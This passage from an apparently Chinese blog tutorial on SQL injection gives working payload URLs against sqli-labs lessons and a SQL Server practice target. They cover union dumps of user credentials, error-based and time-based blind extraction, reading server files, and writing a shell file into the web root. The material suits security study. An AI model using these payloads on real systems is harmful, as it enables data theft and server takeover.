qwe</span><br></pre></td></tr></table></figure><p>/<em>查询所有库</em>/</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,group_concat(schema_name) from information_schema.schemata -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526145550.png" alt="image-20210526145543573"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526150858.png" alt="image-20210526150851830"></p><h4 id="查询表名">查询表名</h4><p>mysql 里面有一个库 information_schema 里面存在很多信息，其中包括所有的库名， 表名， 字段名。因此可以利用这个库来获取当前库的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=&#x27;security&#x27; -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526150757.png" alt="image-20210526150751007"></p><p>group_concat()  连接所有非 NULL 的字符串</p><ul><li><p>limit 1,1 获取第一个</p></li><li><p>limit 2,1 获取第二个</p></li></ul><h4 id="查询字段">查询字段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,group_concat(column_name)  from information_schema.columns where table_name=&#x27;users&#x27; -- qwe</span><br><span class="line"></span><br><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 -- qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526151629.png" alt="image-20210526151623218"></p><h4 id="查询数据">查询数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-1/?id=&#x27; -1  union select 1,2,group_concat(0x3c2f62723e,id,0x7e,username,0x7e,password)  from users -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526152328.png" alt="image-20210526152321286"></p><h4 id="查询失败的原因">查询失败的原因</h4><p>这种方面不是通用的，有时候 查询不全 这个原因是字段的大小问题。解决办法 换一 个字段查询，或者 用函数查询长度再用字符串函数截取</p><h4 id="读写操作">读写操作</h4><p>MYSQL 新特性 secure_file_priv 对读写文件的影响 此开关默认为 NULL，即不允许导入导出。</p><p>secure_file_priv 为空是 的时候 方可读写 由于这个参数不能动态更改，只能在 mysql 的配置文 件中进行修改，然后重启生效。 可以通过命令查看这个属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv</span><br></pre></td></tr></table></figure><p>secure_file_priv 为 null 表示不允许导入导出</p><p>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</p><p>secure_file_priv 没有设置时，则表示没有任何限制</p><p>写入文件的时候还需要看 php.ini 里面 gpc 是否开启 开启的情况下 特殊字符都会被转义 ’ 变成  '</p><p>load_file()读取文件函数</p><p>读取当前目录下的 index.php 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target_sys.com/article.php?id=-1 union select  1,2,load_file(&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\index.php&#x27;)</span><br></pre></td></tr></table></figure><ul><li><p>into outfile 文件导出 空格</p></li><li><p>into dumpfile 没有空格</p></li></ul><p>1、gpc 关闭</p><p>2、目录可写</p><p>写 shell 话到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target_sys.com/article.php?id=-1 union select 1,&#x27;&#x27;,3 into outfile  &#x27;C:\\inetpub\\wwwroot\\target_sys.com\\smoon.php&#x27;</span><br></pre></td></tr></table></figure><hr><h3 id="报错注入">报错注入</h3><hr><p>mysql 在执行 SQL 语句的时 如果语句有错 会返回报错信息，在与 php 结合使用的时候默认并 不会把报错的信息在页面显示出来</p><p>如果要在 php 显示出来 将在执行语句的时候使用 mysql_error() 才可以把错误的信息 显示到页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select * from article where id=<span class="subst">$id</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></table></figure><h4 id="判断注入-2">判断注入</h4><ul><li>and 1=1</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and 1=1 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526154023.png" alt="image-20210526154017081"></p><ul><li>and 1=2</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and 1=2 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526154046.png" alt="image-20210526154040880"></p><h4 id="报错语句">报错语句</h4><h5 id="通过-floor-报错">通过 floor 报错</h5><ul><li>/<em>数据库版本</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))  from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables  group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) </span><br><span class="line">from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables </span><br><span class="line">group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526192844.png" alt="image-20210526192837729"></p><ul><li>/<em>连接用户</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e)))  from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables  group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) </span><br><span class="line">from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables </span><br><span class="line">group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193002.png" alt="image-20210526192956089"></p><ul><li>/<em>连接数据库</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (select  concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (select </span><br><span class="line">concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x </span><br><span class="line">from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193109.png" alt="image-20210526193102897"></p><ul><li>/<em>暴库</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193613.png" alt="image-20210526193607574"></p><ul><li>/<em>暴表</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct  concat(0x7e,table_name,0x7e) FROM information_schema.tables where  table_schema=database() LIMIT 0,1)) from information_schema.tables limit  0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,table_name,0x7e) FROM information_schema.tables where </span><br><span class="line">table_schema=database() LIMIT 0,1)) from information_schema.tables limit </span><br><span class="line">0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193914.png" alt="image-20210526193908156"></p><ul><li>limit 3,1</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193946.png" alt="image-20210526193940169"></p><ul><li>/<em>暴字段</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct  concat(0x7e,column_name,0x7e) FROM information_schema.columns where  table_name=0x7573657273 LIMIT 0,1)) from information_schema.tables limit  0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,column_name,0x7e) FROM information_schema.columns where </span><br><span class="line">table_name=0x7573657273 LIMIT 0,1)) from information_schema.tables limit </span><br><span class="line">0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194225.png" alt="image-20210526194219860"></p><ul><li>limit 1,1</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194259.png" alt="image-20210526194253727"></p><ul><li>limit 2,1</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194315.png" alt=""></p><ul><li>/<em>暴内容</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables` </span><br><span class="line">`group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables </span><br><span class="line">group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194601.png" alt="image-20210526194555411"></p><h5 id="ExtractValue-有长度限制-最长-32-位">ExtractValue(有长度限制,最长 32 位)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and extractvalue(1, concat(0x7e, (select @@version),0x7e))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194803.png" alt="image-20210526194757272"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195009.png" alt="image-20210526195003480"></p><h5 id="UpdateXml-有长度限制-最长-32-位">UpdateXml(有长度限制,最长 32 位)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195113.png" alt="image-20210526194757272"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23)  FROM users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23)  FROM users limit 0,1),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195009.png" alt="image-20210526195003480"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT distinct  LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT distinct </span><br><span class="line">LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM users limit 0,1),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201802.png" alt="image-20210526201756403"></p><p>查询长度为11</p><p>SUBSTRING()字符串截取函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT distinct </span><br><span class="line">SUBSTRING(concat(0x23,username,0x3a,password,0x23),1,11) FROM users limit </span><br><span class="line">0,1),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526202020.png" alt="image-20210526202013669"></p><h5 id="NAME-CONST-适用于低版本">NAME_CONST(适用于低版本)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as +x)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as</span><br><span class="line">+x)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195451.png" alt="image-20210526195445181"></p><h5 id="Error-based-Double-Query-Injection">Error based Double Query Injection</h5><ul><li>/<em>数据库版本</em>/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195703.png" alt="image-20210526195657239"></p><p>还有一些报错语句</p><h5 id="geometrycollection">geometrycollection()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and geometrycollection((select * from(select * from(select  user())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and geometrycollection((select * from(select * from(select </span><br><span class="line">user())a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200153.png" alt="image-20210526200147408"></p><h5 id="multipoint">multipoint()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint((select * from(select * from(select database())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and multipoint((select * from(select * from(select database())a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200334.png" alt="image-20210526200327968"></p><h5 id="polygon">polygon()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon((select * from(select * from(select @@basedir MYSQL)a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and polygon((select * from(select * from(select @@basedir MYSQL)a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200651.png" alt="image-20210526200645488"></p><h5 id="multipolygon">multipolygon()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and multipolygon((select * from(select * from(select` </span><br><span class="line">`@@version_compile_os)a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and multipolygon((select * from(select * from(select </span><br><span class="line">@@version_compile_os)a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200835.png" alt="image-20210526200829020"></p><h5 id="linestring">linestring()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring((select * from(select * from(select @@datadir)a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and linestring((select * from(select * from(select @@datadir)a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201026.png" alt="image-20210526201019882"></p><h5 id="multilinestring">multilinestring()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and multilinestring((select * from(select * from(select` </span><br><span class="line">`session_user())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and multilinestring((select * from(select * from(select </span><br><span class="line">session_user())a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201130.png" alt="image-20210526201124166"></p><h5 id="exp">exp()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and exp(~(select * from(select user())a))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201222.png" alt="image-20210526201215634"></p><h4 id="读取文件">读取文件</h4><h5 id="extractvalue-读取文件-32长度限制">extractvalue 读取文件 32长度限制</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select  load_file(&#x27;/hello.php&#x27;)),0x7e)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and (extractvalue(1,concat(0x7e,(select  load_file(&#x27;/hello.php&#x27;)),0x7e)))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526203950.png" alt="image-20210526203943218"></p><h5 id="exp-方法读取">exp 方法读取</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (exp(~(select*from(select  load_file(&#x27;/hello.php&#x27;))a)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and (exp(~(select*from(select </span><br><span class="line">load_file(&#x27;/hello.php&#x27;))a)))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526204101.png" alt="image-20210526204054718"></p><hr><h3 id="延时注入">延时注入</h3><hr><p>延时注入属于盲注入的一种，这种注入通过 mysql 里面的 sleep()函数,这个函数的意思是延时 执行多少秒。</p><p>sleep 通常与 if 一起使用 例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(&#x27;root&#x27;=&#x27;root&#x27;,sleep(3),0)  </span><br></pre></td></tr></table></figure><p>如果 字符串 root 等于 root 数据库延时 3 秒 否则输出 0</p><p>延时方法是先获取数据的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(LENGTH(version())=6,sleep(3),0) </span><br></pre></td></tr></table></figure><p>再查询数据，这就是我们常用的一些字符 把他们转为 ASCII 码方便进行对比。 abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substring(version(),1,1))=53,sleep(3),0) </span><br></pre></td></tr></table></figure><p>字符串截取长度 substring()</p><p>字符转 ascii 码 ascii()</p><h4 id="判断注入-3">判断注入</h4><p>and sleep(5)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and sleep(5)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526205537.png" alt="image-20210526205531159"></p><h4 id="获取-mysql-版本">获取 mysql 版本</h4><p>and if(LENGTH(version())=这个是长度,sleep(3),0) 当长度到 23 的时候 页面延时 3 秒返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.dansemal.cn/Less-5/?id=1&#x27; and if(LENGTH(version())=23,sleep(3),0)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526210545.png" alt="image-20210526210538684"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substring((select version()),1,1))=53,sleep(5),0) `</span><br><span class="line"></span><br><span class="line">`select if(ascii(substring((select version()),2,1))=46,sleep(5),0) `</span><br><span class="line"></span><br><span class="line">`select if(ascii(substring((select version()),3,1))=53,sleep(5),0) `</span><br><span class="line"></span><br><span class="line">`select if(ascii(substring((select version()),4,1))=46,sleep(5),0) `</span><br><span class="line"></span><br><span class="line">`select if(ascii(substring((select version()),5,1))=52,sleep(5),0) `</span><br><span class="line"></span><br><span class="line">`select if(ascii(substring((select version()),6,1))=54,sleep(5),0)</span><br></pre></td></tr></table></figure><hr><h2 id="sqlserver-联合注入">sqlserver 联合注入</h2><hr><p>sqlserver 经常与 asp 或者 aspx 一起使用，操作系统多数是 win2012 win2018</p><p>数据库版本 sql2008 sql2012</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1</span><br></pre></td></tr></table></figure><h4 id="注释">注释</h4><ul><li><p>–空格 单行注释</p></li><li><p>/* */ 多行注释</p></li></ul><h4 id="判断是否注入">判断是否注入</h4><ul><li><p>’ 单引号是否报错</p></li><li><p>and 1=2</p></li><li><p>and 1=1 页面是否相同</p></li></ul><h4 id="判断列数-2">判断列数</h4><p>order by</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526211646.png" alt="image-20210526211640624"></p><p>order by 3 正常</p><h4 id="联合查询">联合查询</h4><p>联合查询 需要每个列的类型要一直 或者可以使用 null 直到页面出错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1&#x27; union select 1,&#x27;2&#x27;,&#x27;3&#x27; --qwe</span><br></pre></td></tr></table></figure><p><img 